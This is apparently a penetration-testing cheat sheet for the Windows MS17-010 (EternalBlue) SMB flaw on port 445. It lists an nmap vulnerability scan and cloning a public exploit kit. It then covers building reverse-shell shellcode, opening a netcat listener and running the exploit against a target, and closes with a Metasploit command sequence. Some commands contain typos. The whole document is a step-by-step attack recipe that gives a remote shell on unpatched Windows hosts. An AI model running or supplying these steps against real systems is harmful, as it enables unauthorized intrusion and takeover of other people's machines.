# Windows MS17-010 SMB Vulnerability(Eternal Blue) - 445

## manual
- `nmap -sV -p 445 --script=smb-vuln-ms17-010 10.0.1.22`
- `git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git`
  - `cd shellcode`
  - `./shell_prep.sh`
  - `1. you ip, 2.port, 3. port, 4. 1, 5.1 `
  - ` nc lnvp 1234`
  - ` python eternlblue_exploit7.py <target ip> shellcode/sc_x64.bin`

## automatic
```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set rhosts <target ip>
exploit
```
